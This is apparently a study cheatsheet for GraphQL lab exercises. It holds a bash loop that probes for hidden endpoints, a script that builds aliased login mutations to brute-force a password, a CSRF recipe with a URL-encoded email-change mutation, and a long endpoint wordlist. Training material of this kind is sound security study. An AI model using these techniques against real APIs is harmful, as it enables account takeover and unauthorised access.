# GraphQL API Vulnerabilities - CHEATSHEET + LABS

## Key Terms

```
- GraphQL       -> a query language for APIs that allows clients to request exactly the data they need and nothing more.

- Introspection -> a special query that asks the GraphQL server for information about its own schema.

- Mutations     -> operations that modify data (create, update, or delete).

- Aliases       ->  allow sending multiple queries or mutations in a single request by giving each one a unique identifier.
```

## Walkthrough - Most Important Labs

- [GraphQL API exposure private field](GraphQL-API-exposure-private-field.md)
- [GrapQL brute-force via grapql ALIASES (script aliases-generator)](graphql-bruteforce-via-aliases.md)

## Cheat Sheet

> Finding a hidden GraphQL endpoint (use wordlist below)
```bash
while read -r i; do
    if curl -s "https://<IP>/$i" | grep -qi "query"; then
        echo "[MATCH]: $i"
    fi
done < x.txt
# OUTPUT EXAMPLE:
[MATCH]: api  
# /api?query=
```

> Script to generate multiple aliases to attempt brute-force 
```bash
text='''
alias_x: login(input: {username: "carlos", password: "BRUTE-FORCE"}) {\n
\ttoken\n
\tsuccess\n
  }
'''
count=1
cat pass-bscp.txt | while read i; do 
  echo -e $text | sed "s/BRUTE-FORCE/$i/" | sed "s/alias_x/alias_$count/"
 let count+=1
done
```

> Login accept x-www-form?

> CSRF -> change content-type to application/x-www-form-urlencoded -> modify the necessary parameters -> Engagement tools -> Generate CSRF -> send to victim

> Adapt the body to url format:
```bash
    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22foo%40foo.com%22%7D%7D
```

## Common endpoints

```
api
___graphql
altair
explorer
graphiql
graphiql.css
graphiql/finland
graphiql.js
graphiql.min.css
graphiql.min.js
graphiql.php
graphql
graphql/console
graphql-explorer
graphql.php
graphql/schema.json
graphql/schema.xml
graphql/schema.yaml
playground
subscriptions
api/graphql
je/graphql
graph
v1/altair
v1/explorer
v1/graphiql
v1/graphiql.css
v1/graphiql/finland
v1/graphiql.js
v1/graphiql.min.css
v1/graphiql.min.js
v1/graphiql.php
v1/graphql
v1/graphql/console
v1/graphql-explorer
v1/graphql.php
v1/graphql/schema.json
v1/graphql/schema.xml
v1/graphql/schema.yaml
v1/playground
v1/subscriptions
v1/api/graphql
v1/graph
v2/altair
v2/explorer
v2/graphiql
v2/graphiql.css
v2/graphiql/finland
v2/graphiql.js
v2/graphiql.min.css
v2/graphiql.min.js
v2/graphiql.php
v2/graphql
v2/graphql/console
v2/graphql-explorer
v2/graphql.php
v2/graphql/schema.json
v2/graphql/schema.xml
v2/graphql/schema.yaml
v2/playground
v2/subscriptions
v2/api/graphql
v2/graph
v3/altair
v3/explorer
v3/graphiql
v3/graphiql.css
v3/graphiql/finland
v3/graphiql.js
v3/graphiql.min.css
v3/graphiql.min.js
v3/graphiql.php
v3/graphql
v3/graphql/console
v3/graphql-explorer
v3/graphql.php
v3/graphql/schema.json
v3/graphql/schema.xml
v3/graphql/schema.yaml
v3/playground
v3/subscriptions
v3/api/graphql
v3/graph
v4/altair
v4/explorer
v4/graphiql
v4/graphiql.css
v4/graphiql/finland
v4/graphiql.js
v4/graphiql.min.css
v4/graphiql.min.js
v4/graphiql.php
v4/graphql
v4/graphql/console
v4/graphql-explorer
v4/graphql.php
v4/graphql/schema.json
v4/graphql/schema.xml
v4/graphql/schema.yaml
v4/playground
v4/subscriptions
v4/api/graphql
v4/graph
```